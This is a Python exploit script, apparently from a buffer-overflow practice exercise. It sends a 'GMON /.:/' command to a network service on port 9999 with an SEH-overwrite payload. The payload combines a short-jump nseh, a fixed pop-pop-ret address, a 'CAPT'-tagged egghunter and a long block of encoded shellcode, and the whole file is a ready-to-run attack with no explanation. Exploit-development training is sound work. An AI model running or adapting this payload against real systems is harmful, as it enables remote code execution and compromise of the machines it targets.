#!/usr/bin/python

import os
import sys
import socket
from pwn import *

#badchars \x00
host = "192.168.1.108"
port = 9999


nseh = "\xEB\xCE\x90\x90"
seh = p32(0x625010b4)

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode =  ""
shellcode += "\xba\x53\xa3\xac\x7f\xdb\xdc\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\x03"
shellcode += "\xad\x4e\x8a\x5f\x59\x0c\x75\x9f\x9a\x71\xff\x7a"
shellcode += "\xab\xb1\x9b\x0f\x9c\x01\xef\x5d\x11\xe9\xbd\x75"
shellcode += "\xa2\x9f\x69\x7a\x03\x15\x4c\xb5\x94\x06\xac\xd4"
shellcode += "\x16\x55\xe1\x36\x26\x96\xf4\x37\x6f\xcb\xf5\x65"
shellcode += "\x38\x87\xa8\x99\x4d\xdd\x70\x12\x1d\xf3\xf0\xc7"
shellcode += "\xd6\xf2\xd1\x56\x6c\xad\xf1\x59\xa1\xc5\xbb\x41"
shellcode += "\xa6\xe0\x72\xfa\x1c\x9e\x84\x2a\x6d\x5f\x2a\x13"
shellcode += "\x41\x92\x32\x54\x66\x4d\x41\xac\x94\xf0\x52\x6b"
shellcode += "\xe6\x2e\xd6\x6f\x40\xa4\x40\x4b\x70\x69\x16\x18"
shellcode += "\x7e\xc6\x5c\x46\x63\xd9\xb1\xfd\x9f\x52\x34\xd1"
shellcode += "\x29\x20\x13\xf5\x72\xf2\x3a\xac\xde\x55\x42\xae"
shellcode += "\x80\x0a\xe6\xa5\x2d\x5e\x9b\xe4\x39\x93\x96\x16"
shellcode += "\xba\xbb\xa1\x65\x88\x64\x1a\xe1\xa0\xed\x84\xf6"
shellcode += "\xc7\xc7\x71\x68\x36\xe8\x81\xa1\xfd\xbc\xd1\xd9"
shellcode += "\xd4\xbc\xb9\x19\xd8\x68\x6d\x49\x76\xc3\xce\x39"
shellcode += "\x36\xb3\xa6\x53\xb9\xec\xd7\x5c\x13\x85\x72\xa7"
shellcode += "\xf4\x6a\x2a\xa6\x0c\x03\x29\xa8\x08\x01\xa4\x4e"
shellcode += "\x7a\xb5\xe1\xd9\x13\x2c\xa8\x91\x82\xb1\x66\xdc"
shellcode += "\x85\x3a\x85\x21\x4b\xcb\xe0\x31\x3c\x3b\xbf\x6b"
shellcode += "\xeb\x44\x15\x03\x77\xd6\xf2\xd3\xfe\xcb\xac\x84"
shellcode += "\x57\x3d\xa5\x40\x4a\x64\x1f\x76\x97\xf0\x58\x32"
shellcode += "\x4c\xc1\x67\xbb\x01\x7d\x4c\xab\xdf\x7e\xc8\x9f"
shellcode += "\x8f\x28\x86\x49\x76\x83\x68\x23\x20\x78\x23\xa3"
shellcode += "\xb5\xb2\xf4\xb5\xb9\x9e\x82\x59\x0b\x77\xd3\x66"
shellcode += "\xa4\x1f\xd3\x1f\xd8\xbf\x1c\xca\x58\xdf\xfe\xde"
shellcode += "\x94\x48\xa7\x8b\x14\x15\x58\x66\x5a\x20\xdb\x82"
shellcode += "\x23\xd7\xc3\xe7\x26\x93\x43\x14\x5b\x8c\x21\x1a"
shellcode += "\xc8\xad\x63"



payload = "CAPTCAPT"
payload += shellcode
payload += "A"*(3467-len(payload))
payload += egghunter
payload += "A"*(3515-len(payload)) 
payload += nseh
payload += seh
payload += "D"*(5000 - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + payload)
print s.recv(1024)
s.close()





